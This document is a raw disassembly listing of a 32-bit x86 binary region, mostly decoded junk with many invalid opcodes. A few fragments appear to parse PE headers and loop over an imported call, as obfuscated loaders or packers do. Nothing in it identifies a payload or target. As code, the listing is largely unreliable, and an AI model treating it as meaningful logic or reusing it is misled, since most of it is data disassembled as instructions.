  409c50:	xlat   BYTE PTR ds:[ebx]
  409c51:	xchg   edi,eax
  409c52:	lea    ecx,[ecx+0x491c0c39]
  409c58:	or     DWORD PTR [ecx],edx
  409c5a:	xchg   bl,dh
  409c5c:	stc    
  409c5d:	sub    eax,0x6a96548c
  409c62:	sub    al,0xe
  409c64:	and    eax,0x931e261b
  409c69:	pop    ss
  409c6a:	sbb    dl,BYTE PTR [edx+0x5289ca46]
  409c70:	sbb    al,ch
  409c72:	sar    BYTE PTR [eax+0x3ff2147a],0x39
  409c79:	lahf   
  409c7a:	add    DWORD PTR [eax-0x46],edi
  409c7d:	xor    al,0xd7
  409c7f:	jl     0x409c99
  409c81:	(bad)  
  409c83:	(bad)  
  409c84:	jg     0x409c20
  409c86:	es stos BYTE PTR es:[edi],al
  409c88:	das    
  409c89:	mov    ds:0x4190c5cb,eax
  409c8e:	fiadd  WORD PTR [ecx+0x5b]
  409c91:	inc    edi
  409c92:	xor    al,0xfe
  409c94:	and    eax,DWORD PTR [esp+edi*2]
  409c97:	push   0x35e04d76
  409c9c:	out    dx,eax
  409c9d:	jmp    0x409c28
  409c9f:	lock (bad) 
  409ca2:	mov    esp,0x81008ac7
  409ca7:	adc    eax,0x4247d6
  409cac:	loopne 0x409c64
  409cae:	inc    esp
  409caf:	add    BYTE PTR [esi*1+0x66e94934],al
  409cb6:	add    DWORD PTR [eax],eax
  409cb8:	add    BYTE PTR [ecx],al
  409cba:	bound  esp,QWORD PTR [eax-0x13]
  409cbd:	arpl   bp,bp
  409cbf:	cdq    
  409cc0:	jp     0x409c53
  409cc2:	fldenv [esi+ebx*2+0x297aabe8]
  409cc9:	mov    cl,0xc0
  409ccb:	jl     0x409d49
  409ccd:	retf   0x7c7f
  409cd0:	jl     0x409ce6
  409cd2:	push   ebx
  409cd3:	dec    edi
  409cd4:	jg     0x409d43
  409cd6:	mov    ebx,0x121739bc
  409cdb:	inc    ebx
  409cdc:	jle    0x409d51
  409cde:	add    bh,BYTE PTR [esi]
  409ce0:	xchg   edx,eax
  409ce1:	and    BYTE PTR [edi-0x32],0x81
  409ce5:	(bad)  
  409ce6:	out    0x1a,al
  409ce8:	dec    edi
  409ce9:	in     al,dx
  409cea:	adc    DWORD PTR [edx-0x25444a27],ebx
  409cf0:	repz in eax,dx
  409cf2:	popa   
  409cf3:	inc    ebp
  409cf4:	mov    ebp,0x8628ef8a
  409cf9:	aam    0x58
  409cfb:	je     0x409d53
  409cfd:	adc    eax,0x1996428b
  409d02:	popa   
  409d03:	repz fnsave [eax]
  409d06:	xchg   dx,ax
  409d08:	dec    eax
  409d09:	clc    
  409d0a:	test   al,0xc5
  409d0c:	and    al,0x85
  409d0e:	jge    0x409d58
  409d10:	ja     0x409d7e
  409d12:	adc    al,0xb4
  409d14:	cmp    BYTE PTR [eax-0x36],ch
  409d17:	popa   
  409d18:	addr16 out 0x1e,eax
  409d1b:	retf   
  409d1c:	sti    
  409d1d:	pop    edx
  409d1e:	clc    
  409d1f:	imul   edi,DWORD PTR [edi-0x6f9d0d9],0xc07b154b
  409d29:	xchg   ebp,eax
  409d2a:	jg     0x409d48
  409d2c:	mov    bh,0xa8
  409d2e:	push   ss
  409d2f:	adc    al,0x42
  409d31:	(bad)  
  409d33:	dec    edi
  409d34:	fdiv   QWORD PTR [edx-0x507c60d4]
  409d3a:	cld    
  409d3b:	xchg   ebp,eax
  409d3c:	pop    ds
  409d3d:	pop    esp
  409d3e:	or     dl,BYTE PTR [ebp+0x74]
  409d41:	mov    eax,0x204b681e
  409d46:	pop    esp
  409d47:	cs push eax
  409d49:	xchg   esi,eax
  409d4a:	push   cs
  409d4b:	xchg   ebp,eax
  409d4c:	fidiv  WORD PTR [ebx]
  409d4e:	test   al,0x70
  409d50:	mov    esp,0xb963afb1
  409d55:	cmp    ebx,DWORD PTR [edi-0x2ad19184]
  409d5b:	rcl    DWORD PTR [eax],cl
  409d5d:	pop    es
  409d5e:	mov    cl,0xe0
  409d60:	fisub  DWORD PTR ds:0x9a298e62
  409d66:	lea    esp,[esi+0x5588c228]
  409d6c:	push   ss
  409d6d:	pop    edi
  409d6e:	cmp    DWORD PTR [ecx-0x67e920d5],ecx
  409d74:	enter  0x8e7e,0x13
  409d78:	and    edx,esi
  409d7a:	dec    esi
  409d7b:	fwait
  409d7c:	test   al,0x69
  409d7e:	sbb    bl,cl
  409d80:	push   0xa0e182c1
  409d85:	sbb    cl,BYTE PTR [edx+eax*2-0x6225307b]
  409d8c:	shr    ah,1
  409d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d8f:	in     eax,0x13
  409d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d92:	jl     0x409dfe
  409d94:	jecxz  0x409df1
  409d96:	call   0xa9d09f48
  409d9b:	cmc    
  409d9c:	push   cs
  409d9d:	mov    ah,0xbd
  409d9f:	add    DWORD PTR [edx+0x7a],0xffffff9b
  409da3:	sahf   
  409da4:	or     BYTE PTR [ebp-0x2b],bl
  409da7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409da9:	call   DWORD PTR [ebp+0x32]
  409dac:	sub    eax,0xe6c874cb
  409db1:	ret    
  409db2:	mov    ebp,0x35a6ecb0
  409db7:	jno    0x409dde
  409db9:	sub    al,0x97
  409dbb:	addr16 in eax,0x26
  409dbe:	add    DWORD PTR [esi-0x8c4e509],eax
  409dc4:	call   0x7651:0x53ee62d
  409dcb:	das    
  409dcc:	es add bh,cl
  409dcf:	pop    edi
  409dd0:	mov    al,0xf1
  409dd2:	stos   BYTE PTR es:[edi],al
  409dd3:	sub    bl,BYTE PTR [ebp+0x53bde660]
  409dd9:	pop    ss
  409dda:	pop    esp
  409ddb:	push   ds
  409ddc:	sar    DWORD PTR [edi-0x65],cl
  409ddf:	jns    0x409e1a
  409de1:	inc    esp
  409de2:	pop    esi
  409de3:	mov    bh,0xcd
  409de5:	adc    ecx,DWORD PTR [ecx-0x27990e68]
  409deb:	in     eax,dx
  409dec:	sbb    BYTE PTR [edx+0x74],0x86
  409df0:	loope  0x409e20
  409df2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  409df4:	xchg   DWORD PTR [ebx],esi
  409df6:	rol    BYTE PTR fs:0x4c990279,0xad
  409dfe:	rcr    BYTE PTR [ecx+esi*2-0x309dd27e],1
  409e05:	(bad)  
  409e06:	jmp    0xf411:0x3425fdfb
  409e0d:	xchg   BYTE PTR [eax],ch
  409e0f:	sub    dl,BYTE PTR [edi+0x15]
  409e12:	sar    eax,0x41
  409e15:	fldcw  WORD PTR [edx+0x59bb9f08]
  409e1b:	inc    edi
  409e1c:	push   0xcb3c4767
  409e21:	mov    DWORD PTR ds:0x4247be,0x71b7
  409e2b:	jne    0x40a324
  409e31:	or     DWORD PTR ds:0x410757,edx
  409e37:	mov    eax,DWORD PTR [ebp+0x8]
  409e3a:	mov    ecx,DWORD PTR [ebp+0x8]
  409e3d:	adc    DWORD PTR ds:0x448988,0x48d6
  409e47:	add    ecx,DWORD PTR [eax+0x3c]
  409e4a:	mov    edx,DWORD PTR ds:0x4454dc
  409e50:	xor    eax,eax
  409e52:	or     eax,DWORD PTR ds:0x4454e8
  409e58:	sub    eax,edx
  409e5a:	and    edx,DWORD PTR [edx+eax*1]
  409e5d:	mov    edx,0x7510857
  409e62:	mov    DWORD PTR ds:0x410743,0x1d
  409e6c:	cmp    DWORD PTR ds:0x410743,0x0
  409e73:	je     0x409eb2
  409e79:	cmp    DWORD PTR ds:0x410743,0x2c
  409e80:	jne    0x409ea2
  409e86:	push   DWORD PTR [ebp-0x1c]
  409e89:	push   DWORD PTR [ebp-0x28]
  409e8c:	push   DWORD PTR [ebp-0x10]
  409e8f:	push   0x1f6d
  409e94:	push   0x61b1
  409e99:	push   DWORD PTR [ebp-0x14]
  409e9c:	call   DWORD PTR ds:0x443044
  409ea2:	mov    eax,ds:0x410743
  409ea7:	dec    eax
  409ea8:	mov    ds:0x410743,eax
  409ead:	jmp    0x409e6c
  409eb2:	mov    DWORD PTR [ebp+0x8],ecx
  409eb5:	mov    eax,DWORD PTR [ebp-0x4]
  409eb8:	xor    eax,edx
  409eba:	push   esi
  409ebb:	mov    esi,DWORD PTR [ebp+0x8]
  409ebe:	mov    ecx,0x32729e
  409ec3:	add    eax,ecx
  409ec5:	cmp    DWORD PTR [esi+0x54],eax
  409ec8:	jmp    0x40a033
  409ecd:	mov    esi,0x45a9bf40
  409ed2:	mov    ebp,0xfb297b56
  409ed7:	test   BYTE PTR [esi-0x1748340e],bl
  409edd:	cmpps  xmm7,XMMWORD PTR [esp+edi*2-0x36],0x7f
  409ee3:	jl     0x409f61
  409ee5:	and    esp,esp
  409ee7:	sti    
  409ee8:	inc    ebx
  409ee9:	in     al,0xde
  409eeb:	inc    eax
  409eec:	push   esp
  409eed:	shr    BYTE PTR [ebp-0x2facdb82],cl
  409ef3:	adc    BYTE PTR [esi-0x1e8e5558],0xa3
  409efa:	cmp    bh,dh
  409efc:	jg     0x409e81
  409efe:	and    eax,0x8f5e28b4
  409f03:	adc    ah,BYTE PTR [edi+0x13e95882]
  409f09:	stos   BYTE PTR es:[edi],al
  409f0a:	fdivr  st(0),st
  409f0c:	cmp    esp,DWORD PTR [edx]
  409f0e:	fwait
  409f0f:	scas   al,BYTE PTR es:[di]
  409f11:	stos   DWORD PTR es:[edi],eax
  409f12:	retf   
  409f13:	xor    BYTE PTR [esi],0x3f
  409f16:	jne    0x409f63
  409f18:	daa    
  409f19:	jb     0x409ecb
  409f1b:	mov    ebx,0x4522a5f3
  409f20:	dec    ebp
  409f21:	mov    esi,0x6effbc6c
  409f26:	xor    al,BYTE PTR [ebx-0x1e]
  409f29:	jo     0x409f2a
  409f2b:	imul   eax,DWORD PTR [edx+eiz*4+0x4deabd04],0xffffffba
  409f33:	lock ror eax,0xa
  409f37:	popa   
  409f38:	div    ch
  409f3a:	js     0x409f15
  409f3c:	adc    al,0x2
  409f3e:	cmp    eax,0xb87c5d87
  409f43:	enter  0xb40e,0x5
  409f47:	pop    esi
  409f48:	(bad)  
  409f49:	dec    eax
  409f4a:	jmp    0xd724:0x5e98b1ff
  409f51:	inc    esp
  409f52:	jne    0x409ed8
  409f54:	adc    dl,ah
  409f56:	cmp    bx,WORD PTR [edi-0x50079f2a]
  409f5d:	adc    bl,al
  409f5f:	jns    0x409f05
  409f61:	and    eax,0x5ab8d4f9
  409f66:	iret   
  409f67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f68:	add    BYTE PTR [esi],bl
  409f6a:	sbb    eax,0xf0a7b9df
  409f6f:	rcr    BYTE PTR [esi+0x7d],1
  409f72:	sbb    bh,BYTE PTR es:[eax-0x2c]
  409f76:	pop    es
  409f77:	dec    esp
  409f78:	sbb    al,0x7a
  409f7a:	adc    ebx,DWORD PTR [esi-0x38]
  409f7d:	fwait
  409f7e:	out    0x2b,eax
  409f80:	add    al,BYTE PTR [edi+eiz*4]
  409f83:	xor    DWORD PTR [edx-0x15c176b4],ebp
  409f89:	jmp    0x94ba2c81
  409f8e:	bnd jb 0x409f48
  409f91:	cmp    ecx,DWORD PTR [ebx-0x15]
  409f94:	xor    bl,BYTE PTR [edx+ebp*2+0x78]
  409f98:	adc    DWORD PTR [ecx-0x689ec225],eax
  409f9e:	mov    esi,0xd53ff1eb
  409fa3:	inc    esp
  409fa4:	retf   
  409fa5:	pushf  
  409fa6:	xor    ah,BYTE PTR [edi-0x6e]
  409fa9:	clc    
  409faa:	nop
  409fab:	enter  0xf01c,0xce
  409faf:	sub    DWORD PTR [edx],edx
  409fb1:	cmp    al,0xa7
  409fb3:	retf   0xf42c
  409fb6:	sbb    eax,0xe86e316b
  409fbb:	repz pop ebx
  409fbd:	hlt    
  409fbe:	inc    esp
  409fbf:	jbe    0x40a014
  409fc1:	dec    esi
  409fc2:	inc    esp
  409fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fc4:	ss (bad) 
  409fc6:	dec    esi
  409fc7:	ins    BYTE PTR es:[edi],dx
  409fc8:	pop    esi
  409fc9:	mov    edi,DWORD PTR [ebx+0x54]
  409fcc:	mov    edi,0x2a19c70b
  409fd1:	or     DWORD PTR [edi-0x10c71fc0],ecx
  409fd7:	adc    eax,0xe21dfe06
  409fdc:	stos   DWORD PTR es:[edi],eax
  409fdd:	nop
  409fde:	xor    al,0xbe
  409fe0:	ins    DWORD PTR es:[edi],dx
  409fe1:	xchg   edx,eax
  409fe2:	loopne 0x409fba
  409fe4:	adc    al,0x11
  409fe6:	arpl   ax,si
  409fe8:	adc    BYTE PTR [ebp-0x6000d24e],ch
  409fee:	xor    DWORD PTR [ebp+0x68],esp
  409ff1:	daa    
  409ff2:	inc    edi
  409ff3:	les    esp,FWORD PTR [ecx+0x36]
  409ff6:	add    edi,DWORD PTR [ebp-0x29]
  409ff9:	in     eax,dx
  409ffa:	inc    edx
  409ffb:	mov    esp,0xed69ad2d
  40a000:	sub    al,0x62
  40a002:	scas   eax,DWORD PTR es:[edi]
  40a003:	into   
  40a004:	jo     0x3921bc5a
  40a00a:	call   0x9d16:0x14d51a1c
  40a011:	push   edx
  40a012:	fild   QWORD PTR [esi+0x1d]
  40a015:	icebp  
  40a016:	ja     0x409fd2
  40a018:	loop   0x409fe6
  40a01a:	add    esi,esp
  40a01c:	(bad)  
  40a01d:	jmp    0xd2abbf38
  40a022:	mov    esi,0xead4742b
  40a027:	sbb    dl,bh
  40a029:	xchg   edi,eax
  40a02a:	rcl    edi,cl
  40a02c:	mov    ah,ah
  40a02e:	pop    ecx
  40a02f:	push   0x5e7045ce
  40a034:	je     0x40a1ad
  40a03a:	mov    eax,DWORD PTR [ebp+0x8]
  40a03d:	jmp    0x40a331
  40a042:	jmp    0x40a1ad
  40a047:	xchg   ecx,eax
  40a048:	test   dh,dl
  40a04a:	loopne 0x40a045
  40a04c:	bound  edi,QWORD PTR [ebp+0x7db7845d]
  40a052:	add    DWORD PTR [edx+eax*2],ebp
  40a055:	sahf   
  40a056:	sub    eax,0x7c7cc5dd
  40a05b:	retf   0x7c7f
  40a05e:	jl     0x40a00f
  40a060:	xchg   esi,eax
  40a061:	(bad)  
  40a062:	mov    ebp,0x47746935
  40a067:	(bad)  
  40a068:	mov    ecx,0xa3b2887f
  40a06d:	add    al,0xc4
  40a06f:	jno    0x40a0dd
  40a071:	cmp    al,bh
  40a073:	cs push esi
  40a075:	cmp    ah,BYTE PTR [ebp+0x42219074]
  40a07b:	pop    ds
  40a07c:	leave  
  40a07d:	fs ret 
  40a07f:	(bad)  
  40a080:	stos   BYTE PTR es:[edi],al
  40a081:	imul   eax,DWORD PTR [ebp-0x698fb3b5],0x646f731d
  40a08b:	push   cs
  40a08c:	cmp    cl,0xba
  40a08f:	out    dx,al
  40a090:	xor    BYTE PTR [eax],al
  40a092:	sub    eax,0x4bf7d4d1
  40a097:	scas   eax,DWORD PTR es:[edi]
  40a098:	sub    DWORD PTR [edx+0x4a],edx
  40a09b:	hlt    
  40a09c:	cmp    BYTE PTR [ebp+0x67],ah
  40a09f:	outs   dx,DWORD PTR ds:[esi]
  40a0a0:	pop    edx
  40a0a1:	mov    ebp,0x371b5f68
  40a0a6:	fcmovb st,st(4)
  40a0a8:	cld    
  40a0a9:	push   es
  40a0aa:	xor    cl,BYTE PTR [ecx+0x6c]
  40a0ad:	fs leave 
  40a0af:	pop    ss
  40a0b0:	cmp    BYTE PTR [edi+0x4],ah
  40a0b3:	imul   eax,DWORD PTR [ebx-0x1a],0x290c51af
  40a0ba:	push   ss
  40a0bb:	dec    dl
  40a0bd:	stos   DWORD PTR es:[edi],eax
  40a0be:	jmp    0xb6ab078c
  40a0c3:	retf   
  40a0c4:	jge    0x40a04a
  40a0c6:	aas    
  40a0c7:	pop    ebp
  40a0c8:	mov    BYTE PTR [edx+0x139724e],dh
  40a0ce:	mov    esp,0xb9b188ca
  40a0d3:	and    ebp,DWORD PTR [edx-0x14]
  40a0d6:	fiadd  DWORD PTR [edi]
  40a0d8:	jge    0x40a078
  40a0da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0db:	or     eax,0x12dcf9f2
  40a0e0:	xor    ch,BYTE PTR [esi-0x3]
  40a0e3:	cmp    DWORD PTR [edx-0x395920b5],ebp
  40a0e9:	mov    ss,WORD PTR [ebp+0x68602681]
  40a0ef:	cmp    bh,ch
  40a0f1:	out    0xda,eax
  40a0f3:	pop    ebx
  40a0f4:	jg     0x40a0e0
  40a0f6:	into   
  40a0f7:	imul   esp,DWORD PTR [ebp-0x17],0x62
  40a0fb:	std    
  40a0fc:	mov    ebp,DWORD PTR [ebx]
  40a0fe:	xor    eax,0x350292f3
  40a103:	fnclex 
  40a105:	ffreep st(3)
  40a107:	and    eax,0x53787f1d
  40a10c:	inc    esp
  40a10d:	xchg   esi,eax
  40a10f:	push   edi
  40a110:	mov    fs,WORD PTR [edi+0x12d6f57f]
  40a116:	cmp    al,0x16
  40a118:	out    0xc6,al
  40a11a:	imul   eax,eax,0xffffffff
  40a11d:	adc    edi,DWORD PTR [esi-0x5a]
  40a120:	hlt    
  40a121:	adc    al,0x5
  40a123:	xor    eax,0x4a4530ee
  40a128:	int3   
  40a129:	push   es
  40a12a:	push   ebx
  40a12b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a12c:	jno    0x40a199
  40a12e:	fs stos BYTE PTR es:[edi],al
  40a130:	lods   al,BYTE PTR ds:[esi]
  40a131:	cmp    ah,ah
  40a133:	push   esp
  40a134:	jae    0x40a13b
  40a136:	xor    DWORD PTR [edi],edx
  40a138:	add    BYTE PTR [eax+0x794d3b24],ch
  40a13e:	mov    esi,0xa5ab5b2
  40a143:	mov    edx,0x323cba0f
  40a148:	adc    al,0x1c
  40a14a:	in     al,0x53
  40a14c:	mov    ah,0x51
  40a14e:	aam    0x84
  40a150:	cmp    al,0x53
  40a152:	push   ebp
  40a153:	pop    eax
  40a154:	test   DWORD PTR [ebx],eax
  40a156:	sbb    esp,DWORD PTR [esi-0x3e]
  40a159:	pop    ds
  40a15a:	adc    ch,ch
  40a15c:	mov    bh,bh
  40a15e:	fbld   TBYTE PTR [edx+0x21def306]
  40a164:	ds xchg edi,eax
  40a166:	xor    eax,0xffc7d78
  40a16b:	jg     0x40a1db
  40a16d:	jae    0x40a1b2
  40a16f:	aas    
  40a170:	push   ds
  40a171:	mov    al,0x81
  40a173:	xchg   esi,eax
  40a174:	dec    eax
  40a175:	pop    es
  40a176:	les    ecx,FWORD PTR [esi]
  40a178:	jo     0x40a156
  40a17a:	mov    eax,ds:0xa1a65a44
  40a17f:	mov    cl,0xd4
  40a181:	es out 0xbe,al
  40a184:	or     DWORD PTR [eax-0x10],0xb09cbae8
  40a18b:	mov    bl,0xbc
  40a18d:	test   al,0xcd
  40a18f:	xchg   ebx,eax
  40a190:	add    edx,DWORD PTR cs:[ebp-0x3b]
  40a194:	pop    ecx
  40a195:	out    0x6f,al
  40a197:	dec    ecx
  40a198:	pop    edx
  40a199:	and    eax,0xe96a683d
  40a19e:	es jle 0x40a138
  40a1a1:	(bad)  
  40a1a2:	in     al,dx
  40a1a3:	(bad)  
  40a1a4:	cli    
  40a1a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1a6:	fidivr WORD PTR [eax]
  40a1a8:	adc    BYTE PTR [eax-0x74a4314c],ah
  40a1ae:	inc    ebp
  40a1af:	cld    
  40a1b0:	jmp    0x40a31b
  40a1b5:	aam    0x68
  40a1b7:	rol    BYTE PTR [eax+0x50],1
  40a1ba:	pop    eax
  40a1bb:	fs js  0x40a15e
  40a1be:	jge    0x40a14e
  40a1c0:	fdivrp st(7),st
  40a1c2:	push   cs
  40a1c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1c4:	imul   DWORD PTR [ebx-0x3583833c]
  40a1ca:	jg     0x40a248
  40a1cc:	jl     0x40a173
  40a1ce:	jns    0x40a1b4
  40a1d0:	dec    esp
  40a1d1:	dec    esi
  40a1d2:	mov    WORD PTR [ebx+0x1630fdc6],gs
  40a1d8:	push   edx
  40a1d9:	fdivrp st(1),st
  40a1db:	not    DWORD PTR [ebx-0x17]
  40a1de:	rol    BYTE PTR [ebp+0x72],0x10
  40a1e2:	repnz inc ecx
  40a1e4:	push   0xffffffb6
  40a1e6:	lds    esp,FWORD PTR [eax-0x55]
  40a1e9:	jle    0x40a1e2
  40a1eb:	outs   dx,DWORD PTR ds:[esi]
  40a1ec:	mov    eax,0x909356f
  40a1f1:	ret    
  40a1f2:	xchg   edi,eax
  40a1f3:	jnp    0x40a204
  40a1f5:	mov    esp,DWORD PTR [ecx+ebp*4]
  40a1f8:	call   0xb3399293
  40a1fd:	add    DWORD PTR [esi+eiz*1-0x17fc5f4e],esp
  40a204:	enter  0x6189,0x18
  40a208:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a20a:	jmp    0x46a5:0x7a47aea1
  40a211:	fstp   QWORD PTR [ebx]
  40a213:	xchg   edx,eax
  40a214:	mov    ebp,0xa997c3a5
  40a219:	ja     0x40a1c2
  40a21b:	mov    bh,0xdd
  40a21d:	ret    
  40a21e:	not    DWORD PTR [esi+0x627fbbfb]
  40a224:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40a226:	outs   dx,BYTE PTR ds:[esi]
  40a227:	push   cs
  40a228:	pop    eax
  40a229:	push   0xdd05f5cf
  40a22e:	lods   al,BYTE PTR ds:[esi]
  40a22f:	xor    DWORD PTR [edx],eax
  40a231:	imul   edx,DWORD PTR [ebx],0x7f71de9d
  40a237:	push   ds
  40a238:	jno    0x40a23a
  40a23a:	test   al,0x58
  40a23c:	loope  0x40a1d0
  40a23e:	xchg   ebp,eax
  40a23f:	inc    esp
  40a240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a241:	dec    eax
  40a242:	out    0x47,eax
  40a244:	push   edi
  40a245:	mul    BYTE PTR [eax+0x49]
  40a248:	inc    eax
  40a249:	fwait
  40a24a:	push   0xec31e73a
  40a24f:	cmp    eax,0xf7c6ee6f
  40a254:	in     al,0x93
  40a256:	adc    dh,BYTE PTR [edx+edx*1-0x45]
  40a25a:	sub    eax,0xefbe65e5
  40a25f:	jp     0x40a25c
  40a261:	in     al,dx
  40a262:	aad    0xa1
  40a264:	pop    ecx
  40a265:	push   ebp
  40a266:	outs   dx,DWORD PTR ds:[esi]
  40a267:	mov    dl,0x73
  40a269:	dec    edx
  40a26a:	jg     0x40a2e6
  40a26c:	loope  0x40a2ed
  40a26e:	(bad)  [ebx]
  40a270:	pop    es
  40a271:	adc    al,0xab
  40a273:	imul   edi,DWORD PTR [ecx-0x57],0xa2273ed9
  40a27a:	dec    ebx
  40a27b:	jae    0x40a251
  40a27d:	push   ds
  40a27e:	xor    al,0xff
  40a280:	cs imul ecx,DWORD PTR cs:[edi+0x7],0x6a59c050
  40a289:	outs   dx,BYTE PTR ds:[esi]
  40a28a:	push   esp
  40a28b:	imul   eax,DWORD PTR [ecx+edi*8],0x9ca3f092
  40a292:	(bad)  
  40a293:	xlat   BYTE PTR ds:[ebx]
  40a294:	arpl   WORD PTR [edi-0x3e6ba419],di
  40a29a:	pop    esi
  40a29b:	ficomp WORD PTR gs:[eax-0x6a]
  40a29f:	xchg   ebp,eax
  40a2a0:	les    ebp,FWORD PTR [ecx]
  40a2a2:	sub    ebp,edi
  40a2a4:	dec    ebp
  40a2a5:	sbb    esp,ebx
  40a2a7:	pop    es
  40a2a8:	fidiv  DWORD PTR [ebp+0x58aa280a]
  40a2ae:	push   cs
  40a2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2b0:	daa    
  40a2b1:	ins    BYTE PTR es:[edi],dx
  40a2b2:	data16 ror BYTE PTR fs:[ecx],0xf7
  40a2b7:	mov    edx,0xdabe79dd
  40a2bc:	mov    cl,0xfb
  40a2be:	push   edx
  40a2bf:	lods   al,BYTE PTR ds:[esi]
  40a2c0:	(bad)  
  40a2c1:	fs mov al,0x34
  40a2c4:	mov    ah,0x1
  40a2c6:	push   ebx
  40a2c7:	mov    fs,WORD PTR [ecx]
  40a2c9:	or     eax,0x709e7af8
  40a2ce:	jecxz  0x40a348
  40a2d0:	ret    
  40a2d1:	fmulp  st(2),st
  40a2d3:	xor    ah,ch
  40a2d5:	outs   dx,BYTE PTR ds:[esi]
  40a2d6:	call   0x797:0x507dd8b2
  40a2dd:	(bad)  
  40a2de:	mov    dh,0xc2
  40a2e0:	or     BYTE PTR [ecx-0x4c],0xcd
  40a2e4:	xor    ebx,ecx
  40a2e6:	jmp    0x40a283
  40a2e8:	dec    DWORD PTR [esi+0x7f9c22fb]
  40a2ee:	cld    
  40a2ef:	push   eax
  40a2f0:	and    bh,BYTE PTR gs:[esp+edi*1+0x76]
  40a2f5:	mov    edi,0xf29bc70d
  40a2fa:	sbb    ecx,DWORD PTR [esp+ecx*2+0x2a482384]
  40a301:	add    bh,ch
  40a303:	mov    ch,0xc4
  40a305:	add    bl,dh
  40a307:	arpl   cx,bp
  40a309:	mov    BYTE PTR cs:[edx],bl
  40a30c:	outs   dx,DWORD PTR ds:[esi]
  40a30d:	fld    DWORD PTR [edx]
  40a30f:	push   ds
  40a310:	sti    
  40a311:	sub    dl,bl
  40a313:	mov    edx,0x8402a318
  40a318:	ror    DWORD PTR [esi],1
  40a31a:	rdpmc  
  40a31c:	ret    0xc103
  40a31f:	jmp    0x40a331
  40a324:	mov    eax,DWORD PTR [ebp-0x4]
  40a327:	xor    eax,0x7510857
  40a32c:	add    eax,0x32729e
  40a331:	leave  
  40a332:	ret    0x4
  40a335:	dec    ebp
  40a336:	push   ebp
  40a337:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40a33d:	mov    esp,ebp
  40a33f:	or     ah,dh
  40a341:	dec    ebp
  40a342:	add    bh,al
  40a344:	add    BYTE PTR [eax],cl
  40a346:	add    BYTE PTR [eax],al
  40a348:	mov    DWORD PTR [eax],0x40f44545
  40a34e:	xor    eax,0x9c8b8500
  40a353:	hlt    
  40a354:	clc    
  40a355:	retf   
  40a356:	(bad)  
  40a357:	enter  0x4d45,0xbc
  40a35b:	mov    esi,DWORD PTR [esp+esi*8]
  40a35e:	test   ebx,ecx
  40a360:	pushf  
  40a361:	enter  0x4df8,0x8b
  40a365:	mov    DWORD PTR [ebp-0x20],0x890208
  40a36c:	inc    ebp
  40a36d:	inc    ebp
  40a36e:	cld    
  40a36f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40a375:	or     BYTE PTR [ebx+0x0],dl
  40a378:	mov    ebx,0x8bd5700
  40a37d:	call   DWORD PTR [ecx-0x1]
  40a380:	pop    es
  40a381:	mov    ch,0x33
  40a383:	dec    ebx
  40a385:	(bad)  
  40a386:	mov    eax,0x72009ea4
  40a38b:	push   DWORD PTR [edx]
  40a38d:	or     BYTE PTR [eax],al
  40a38f:	jmp    0xff89:0x75c84d03
  40a396:	dec    ebp
  40a397:	loopne 0x40a369
  40a399:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40a39f:	add    BYTE PTR [ebx],dh
  40a3a1:	mov    ecx,ebx
  40a3a3:	hlt    
  40a3a4:	add    ecx,ebx
  40a3a6:	enter  0x899e,0x32
  40a3aa:	dec    ebp
  40a3ab:	add    ecx,eax
  40a3ad:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40a3b3:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40a3ba:	xor    ecx,ebx
  40a3bc:	retf   
  40a3bd:	enter  0x4d03,0xc8
  40a3c1:	mov    DWORD PTR fs:[eax],ebx
  40a3c4:	lea    eax,[eax]
  40a3c6:	push   esp
  40a3c7:	mov    edi,edi
  40a3c9:	fs (bad) 
  40a3cb:	(bad)  
  40a3cc:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40a3d2:	push   0xffffffff
  40a3d4:	and    bh,bh
  40a3d6:	pop    ecx
  40a3d7:	inc    eax
  40a3d8:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40a3de:	push   0xffffff8b
  40a3e0:	pop    ecx
  40a3e1:	cld    
  40a3e2:	dec    ebp
  40a3e3:	lea    ecx,[ecx+0x45ff08ff]
  40a3e9:	mov    BYTE PTR [edx+0x1],cl
  40a3ec:	add    BYTE PTR [eax],al
  40a3ee:	mov    DWORD PTR [ebp+0x8],0x58008d
  40a3f5:	dec    DWORD PTR [ebp-0x77]
  40a3f8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40a3ff:	cld    
  40a400:	dec    ebp
  40a401:	jne    0x40a436
  40a403:	lea    eax,[ebx]
  40a405:	push   eax
  40a406:	mov    edi,edi
  40a408:	or     BYTE PTR [ecx+0x54a845],cl
  40a40e:	add    al,ch
  40a410:	(bad)  
  40a411:	sub    ebp,esp
  40a413:	add    BYTE PTR [eax],al
  40a415:	rol    BYTE PTR [eax],0x84
  40a418:	inc    ebp
  40a419:	add    dh,BYTE PTR [esi+0x0]
  40a41c:	add    BYTE PTR [ebp-0x73],al
  40a41f:	mov    ebp,DWORD PTR [esp+edx*4]
  40a422:	inc    DWORD PTR [eax]
  40a424:	lea    ecx,[ebx-0x30074f4]
  40a42a:	call   0x41afaf
  40a42f:	add    BYTE PTR [ebp+0x0],cl
  40a432:	jne    0x40a475
  40a434:	dec    DWORD PTR [ebx-0x76210314]
  40a43a:	dec    ebp
  40a43b:	add    DWORD PTR [ebp+0x0],esi
  40a43e:	(bad)  
  40a43f:	xchg   ebp,eax
  40a440:	loopne 0x40a441
  40a442:	inc    eax
  40a443:	inc    DWORD PTR [eax]
